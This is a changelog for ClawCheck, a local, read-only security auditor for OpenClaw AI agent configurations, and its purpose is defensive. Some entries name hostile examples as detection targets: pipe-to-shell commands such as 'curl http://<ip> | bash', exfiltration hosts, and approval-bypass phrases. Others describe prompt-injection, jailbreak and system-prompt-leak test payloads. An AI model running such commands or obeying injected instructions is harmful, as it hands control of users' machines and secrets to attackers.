# Changelog

All notable changes to ClawCheck are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/); versions use [SemVer](https://semver.org/).

## [0.12.0] — 2026-06-19

### Added
- **Full Hebrew finding detail.** The dynamic "why"/detail text (evidence with interpolated
  config values) is now translated in the Hebrew report via render-time fragment-splitting +
  regex rules; config keys, paths, hostnames and values are preserved. This completes the
  bilingual work begun in v0.9 (which translated only static strings). English output is
  unchanged (the translation layer is a no-op for en).

## [0.11.0] — 2026-06-19

### Added
- **Guided mode — "What you can do next" recommendation block.** After every default audit run,
  ClawCheck now prints a short, prioritised list of next steps tailored to your actual findings —
  pointing you to the right tool without requiring you to know any flags. The same list is
  available in `--json` as a `"next_actions"` array (id, title, command, why, priority) and as a
  standalone output via `--next`. The engine (`clawcheck/guide.py`) drives seven recommendation
  triggers: fix prompts for open FAIL findings, skill vetting when third-party skills are
  installed, monitoring setup when B16 is unresolved, live injection test, MCP review, trend
  tracking, and grade sharing. Non-technical users running the skill inside OpenClaw can now
  reach every tool through the agent's natural-language menu — they never need to know a flag.
- **Rewritten SKILL.md conversational playbook.** The agent-facing playbook was replaced with a
  guided, step-by-step flow: first-run orientation, plain-language explanation of Score / Grade /
  Lethal Trifecta, a short numbered next-steps menu drawn from `--next`, and per-choice
  sub-sections covering every tool (`--prompts`, `--vet`, `--monitor`, `--canary`/`--dryrun`/
  `--redteam`, `--trend`, `--percentile`, `--badge`/`--card`). A natural-language-to-tool lookup
  table and an explicit boundary section ("what ClawCheck will NOT do") are included.

**ClawCheck still only CHECKS and GUIDES — it does NOT apply fixes or change your config.**
For every open finding, `--prompts` shows a ready copy-paste prompt you hand to your agent or
apply yourself; ClawCheck never touches your OpenClaw configuration. Everything stays local: no
network calls, no telemetry, no write unless you ask. English report/card output for the four
core renderers (`render_report`, `render_card`, `render_monitor`, `render_prompts`) is
byte-identical to v0.10.0.

## [0.10.0] — 2026-06-19

### Added
- **`--sarif PATH` — local SARIF 2.1.0 output.** Writes a SARIF file to the path you
  specify; compatible with GitHub Code Scanning's "Upload SARIF" step. The file is written
  locally and never uploaded — ClawCheck makes no network calls.
- **`--fail-under N` / `--exit-code` — CI gating.** `--fail-under N` exits 1 when the
  audit score is below N; `--exit-code` exits 1 when any unsuppressed FAIL finding is
  present. Without these flags the exit code stays 0 (backward-compatible).
- **`--verbose` / `--debug` / `--log PATH` — local logging with secret redaction.**
  Structured stdlib `logging` to stderr (INFO or DEBUG level) and optionally to a file.
  Config values that may contain secrets are redacted before being written to any log,
  practising ClawCheck's own B9/B10 checks.
- **`--trend` / `--history PATH` — local score history.** Records each audit result to an
  append-only JSONL file (default `~/.clawcheck/history.jsonl`, `chmod 600`) and prints a
  compact trend table with per-run arrows. History is stored only on your machine.
- **`--percentile` — offline reference percentile.** Shows where your score sits relative
  to a bundled static reference profile. Entirely offline — no comparison over the network,
  no telemetry.
- **Expanded Hebrew translations (detail + fix).** Static detail and fix strings for all
  checks (A1, B1–B25, C3–C5) are now translated in the Hebrew report. Dynamic strings
  containing interpolated config values fall back to English.
- **Reliability FP/FN corpus.** A false-positive / false-negative fixture set guards all
  checks against regressions, supplementing the existing unit tests.

**Everything stays local. No network calls, no telemetry, no phone-home — ever.**
All history, SARIF files, and logs are written only on your machine, only when you ask.

## [0.9.0] — 2026-06-19

### Added
- **Bilingual output (`--lang en|he`).** Hebrew report chrome (headings, labels, section titles),
  all check titles translated to Hebrew, and a right-to-left HTML report (`<html dir="rtl">`,
  `lang="he"`, `body{text-align:right}`) when `--lang he` is passed. Auto-detects Hebrew from the
  `LANG`/`LC_ALL` locale so users in a Hebrew locale get it without any extra flag. Finding
  "why"/detail text stays English in this version — full detail translation is planned. English
  output is byte-identical to v0.8.0; the `--lang en` default changes nothing.

## [0.8.0] — 2026-06-19

### Added
- **Runtime dry-run harness (`--dryrun`).** The behavioral test: emits scenarios of untrusted
  input (email/web/MCP/memory) carrying a *fake* secret + fake tools, and an evaluator that flags
  the agent VULNERABLE if it would call a dangerous tool with that secret. Beyond "is it
  configured" → "does it actually obey an injection". (Deterministic scaffold; live run is agent-driven.)
- **B25 — Update / pinning hygiene.** Flags blind skill auto-update and unpinned install sources
  (a malicious update runs with the agent's full permissions).
- **C5 — Native-binary PATH safety.** Flags a world-writable `openclaw` binary dir or a writable
  PATH dir that could shadow it (poisoned-PATH protection for the native audit). POSIX, advisory.
- **`--verify-self`.** Prints a SHA-256 digest of ClawCheck's own engine source so you can confirm
  it wasn't tampered with against a trusted release.

### Security
- **`.clawcheckignore` governance.** The report warns when a CRITICAL finding (or a critical check
  id B1/B2/B13/B20) is suppressed, and `--monitor` alerts when the ignore file changes — so a
  suppression can't quietly hide a real hole.

## [0.7.0] — 2026-06-19

### Added (agent-behavior checks, from the external review)
- **B20 — Bootstrap/memory write protection.** Flags group/world-writable `SOUL.md`/`AGENTS.md`/
  `TOOLS.md` (or their parent dirs) — anyone who can rewrite them owns the agent's identity. POSIX.
- **B21 — Tool-output trust boundary.** Whether the bootstrap tells the agent that tool output /
  web / email / MCP responses are *data, not instructions*.
- **B22 — Self-modification risk.** Flags when the agent can rewrite its own identity/skills/config
  (write access + exec/fs_write) without human approval.
- **B23 — Approval-bypass directives.** Catches bootstrap language that weakens approval
  ("do not ask confirmation", "assume approved", "auto-approve", …).
- **B24 — MCP server hardening.** Deepens B15: flags `npx@latest`/unpinned stdio MCP, `env: "*"`
  / broad-secret passthrough, token passthrough, and SSRF/metadata-IP reach.
- **Expanded B13 signatures.** URL-safe base64, PowerShell `-EncodedCommand` (UTF-16LE),
  Discord/Telegram webhook exfil, more credential paths, and a same-skill credential+exfil rule.

## [0.6.0] — 2026-06-19

### Added
- **Live red-team suite (`--redteam`).** A library of benign adversarial payloads
  (prompt-injection, jailbreak, system-prompt-leak, tool-abuse, indirect-injection) to feed the
  agent and check whether it obeys — the multi-scenario successor to `--canary`.
- **HTML report (`--html PATH`).** A standalone, self-contained styled report (owner view;
  HTML-escaped; marked private).

### Security (hardening from an external review)
- **Allowlist suffix bypass fixed.** `curl https://evilastral.sh/... | sh` is no longer treated
  as the reputable `astral.sh` — only exact host or real subdomain matches now (B13).
- **Symlink escape blocked.** The installed-skill reader skips symlinks and refuses any path that
  resolves outside the skill directory, so a skill can't make the auditor read other files.
- **Report output is sanitised.** Findings/skill-names/payload previews (untrusted data) are
  stripped of ANSI/OSC (incl. OSC-52 clipboard), bidi-override and zero-width characters.
- **Random canary token** by default (was deterministic), so an agent can't be pre-trained on it.
- **Monitor state** is written `chmod 600`.
- **SKILL.md** now tells the agent to treat audit output as untrusted data (never follow
  instructions inside findings) and accurately states what files are read.

### Fixed
- **C3 (backups) was declared in the catalog but never run** — now registered, with a test that
  fails if any catalog entry is left unregistered.

## [0.5.0] — 2026-06-19

### Added
- **Installable CLI.** `pyproject.toml` (zero dependencies) exposes a `clawcheck` console script
  and `python -m clawcheck`, so it's `pipx install`-able as a standalone tool — not just the
  bundled skill. The CLI moved to `clawcheck/cli.py`; `audit.py` is now a thin shim so the
  OpenClaw skill (`python3 {baseDir}/audit.py`) keeps working unchanged.
- **CI.** GitHub Actions runs the test suite + ruff on every push/PR.

## [0.4.0] — 2026-06-19

### Added
- **Baseline suppression (`.clawcheckignore`).** Accept findings you've reviewed: list a check
  id (`B14`) or a finding fingerprint (`B14:ab12cd34`), one per line. Suppressed findings drop
  out of the score, the report, and monitor alerts. `--show-suppressed` lists them.
- **B17 — Autonomy / heartbeat actions.** Flags when the agent runs autonomously (a `HEARTBEAT.md`
  or schedule) so it can act without you — verify it can't be steered by untrusted input.
- **B18 — Subagent delegation.** Flags when subagents can be spawned and may inherit elevated/exec
  tools without human approval.
- **B19 — Data at-rest protection.** Flags group/world-readable memory/log directories and log
  files (conversation data / PII exposure). POSIX only.

### Fixed
- **Skill registration.** `SKILL.md` misused `requires.config` (a config *key* list) for a file
  path, so OpenClaw treated the requirement as unmet and `/clawcheck` was not available as a
  command. Removed it — the skill now always registers and handles a missing config gracefully.
- **B3 over-strict.** A non-`minimal` `tools.profile` (e.g. `coding`) is a least-privilege
  preference, not a vulnerability — it is now a WARN, not a hard FAIL that capped the score.
  B3 fails only on genuine over-privilege (wildcard `allowFrom`, permissive reachability).

## [0.3.0] — 2026-06-19

### Added
- **Installed-skill / plugin vetting (B13).** Statically scans the *content* of skills you
  downloaded and installed (`~/.openclaw/skills`, `workspace/skills`, …) for the ClawHavoc
  malware class: pipe-to-shell from non-reputable hosts, paste/exfil hosts (glot.io,
  webhook.site, …), credential/wallet exfiltration, password-prompt social engineering, and
  **base64-obfuscated payloads** (decoded and re-scanned — never executed). Caught a real
  malicious `curl http://<ip> | bash` hidden in a trojanised skill during calibration.
- **Egress surface (B14, advisory).** Shows where the agent can reach out (channels,
  external-service skills, outbound tools) so you can see the exfiltration surface.
- **MCP server trust (B15).** Flags configured MCP servers for trust-boundary review
  (prompt injection / SSRF / data exposure); `UNKNOWN` when none are configured.
- **Version / update hygiene (C4, advisory).** Notes the OpenClaw version and reminds you to
  patch (ClawHavoc / CVE-2026-25253 target outdated installs).
- **Built-in audit merge.** ClawCheck now runs your own read-only `openclaw security audit
  --json` and folds its findings into the same report (`--no-native` to disable).
- **Threat-monitoring check (B16).** Verifies whether the user actually has monitoring /
  detection in place (a monitoring skill/plugin such as ClawSec or `openclaw-security-monitor`,
  or monitoring/alerts config); warns if an attack would otherwise go unnoticed.
- **Built-in monitor (`--monitor`).** Optional lightweight monitoring: scheduled re-audit +
  change detection — alerts on a new/modified installed skill, `SOUL.md` drift, a dropped score,
  or a check going PASS → FAIL. Keeps one snapshot at `~/.clawcheck/state.json`. (Scheduled
  re-audit, not a real-time runtime IDS — that heavier model is intentionally out of scope.)
- **`--vet PATH`.** Vet a skill (folder or `SKILL.md`) with the B13 malware scan *before*
  installing it — verdict SAFE / SUSPICIOUS / DANGEROUS. Trust-before-install.
- **`--canary`.** Active prompt-injection self-test: a benign injection + unique token to feed
  the agent; if it echoes the token it's VULNERABLE, else RESISTANT (the live "battle-tested" check).
- **`--badge PATH`.** Write a shields-style SVG grade badge (grade + score only).
- **`--prompts`.** A copy-paste "ask your agent to fix it" prompt per finding.
- **`--save PATH`.** Optionally write the report to a file.

### Changed
- Renamed **ClawShield → ClawCheck** (the tool scans & reports, it does not "shield").
- High-precision tuning: `curl | sh` from reputable installer hosts (uv/rustup/brew/deno/…)
  is not flagged; credential-path mentions are only flagged when exfiltrated on the same line.

### Security
- Provenance: ClawCheck's own checks remain offline, read-only, zero-dependency. The only
  external command is your own `openclaw security audit --json` (fixed args, no shell, no
  `--fix`, with a timeout). The only optional write is `--save`.

## [0.2.0]

### Added
- Cross-platform support (Linux/macOS/Windows): pathlib paths, POSIX-permission checks
  skipped on Windows (NTFS ACLs), and an ASCII output fallback (`--ascii` + auto-detect).

## [0.1.0]

### Added
- Initial prototype: passive, read-only OpenClaw config + bootstrap-file audit.
- Lethal Trifecta correlation (A1) and hardening checks (B1–B12).
- Deterministic A–F score with honesty hard-caps and a shareable badge (grade only).
- Bootstrap-file injection scanning (B6) — a gap the native audit does not cover.
